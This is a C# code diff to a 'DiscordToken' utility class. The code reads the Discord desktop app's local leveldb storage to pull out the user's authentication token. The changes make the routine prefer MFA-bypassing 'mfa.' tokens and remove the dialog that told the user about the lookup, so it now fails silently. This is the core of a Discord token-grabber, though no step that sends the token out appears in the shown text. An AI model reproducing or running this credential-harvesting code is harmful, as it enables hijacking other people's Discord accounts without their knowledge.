@@ -110,25 +110,31 @@ namespace Utils
 
     public class DiscordToken
     {
-        private static string GrabToken(string stringx)
+        private static string grabToken(string file)
         {
-            byte[] bytes = File.ReadAllBytes(stringx);
+            byte[] bytes = File.ReadAllBytes(file);
             string fileContents = Encoding.UTF8.GetString(bytes);
             string authToken = "";
 
             if (fileContents.Contains("token"))
             {
-                string[] array = FindToken(fileContents).Split(new char[]
+                string[] array = cleanArray(fileContents).Split(new char[]
                 {
                     '"'
                 });
 
-                authToken = array[0];
+                for (int i = 0; i < array.Length; i++)
+                {
+                    authToken = array[i];
+
+                    if (authToken.StartsWith("mfa."))
+                        break;
+                }
             }
 
             return authToken;
         }
-        private static bool FindLDB(ref string levelDB)
+        private static bool findLdb(ref string levelDB)
         {
             if (Directory.Exists(levelDB))
             {
@@ -145,7 +151,7 @@ namespace Utils
             return false;
         }
 
-        private static string FindToken(string path)
+        private static string cleanArray(string path)
         {
             string[] array = path.Substring(path.IndexOf("token") + 4).Split(new char[]
             {
@@ -164,13 +170,10 @@ namespace Utils
         {
             string pathStr = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
 
-            if (!FindLDB(ref pathStr))
-            {
-                if (MessageBox.Show("Make sure you are signed into the stable branch of the Discord App and try again.\n\nSearched in\n" + pathStr, "Failed to find .LDB files to obtain Auth Token.") == DialogResult.OK)
-                    return "";
-            }
+            if (!findLdb(ref pathStr))
+                return "";
 
-            string tokenStr = GrabToken(pathStr);
+            string tokenStr = grabToken(pathStr);
 
             return tokenStr;
         }
